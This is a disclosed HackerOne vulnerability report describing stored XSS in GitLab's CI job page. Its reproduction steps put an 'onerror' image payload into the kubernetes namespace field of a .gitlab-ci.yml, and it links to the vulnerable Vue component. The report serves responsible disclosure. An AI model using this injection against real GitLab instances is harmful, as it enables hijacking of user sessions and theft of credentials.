# Stored XSS on the job page

## Report Details
- **Report ID**: 856554
- **URL**: https://hackerone.com/reports/856554
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-22T18:25:31.838Z
- **Disclosed**: 2021-01-08T20:38:32.039Z

## Reporter
- **Username**: mike12
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Hello Gitlab!

### Steps to reproduce:
1. Run Gitlab `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
2. Create a new project with README.md
3. Go to Operations->Kubernetes
	1. Click on the "Add Kubernetes cluster" button
	2. Select the "Add existing cluster" tab
	3. Kubernetes cluster name: cluster-example
	4. API URL: https://google.com
	5. Service Token: token-example
	6. Uncheck the "GitLab-managed cluster" checkbox
	7. Click on the "Add Kubernetes cluster" button
4. Add ".gitlab-ci.yml" file to the repository (to the master branch)

    ```
    deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://google.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
    ```
5. Go to CI/CD->Jobs and open the last job
{F799680}
{F799681}

#### Vulnerable code

All vulnerable code is in one file [environments_block.vue](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue)

1. [Line 125](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L125)
2. [Line 156](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L156)
3. [Line 251](https://gitlab.com/gitlab-org/gitlab/-/blob/c2da59f0376ee8d99ce16100d5c481234bbf9f8a/app/assets/javascripts/jobs/components/environments_block.vue#L251)
4. And other places where `%{kubernetesNamespace}` is used

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

## Attachments
- 1.png
- 2.png
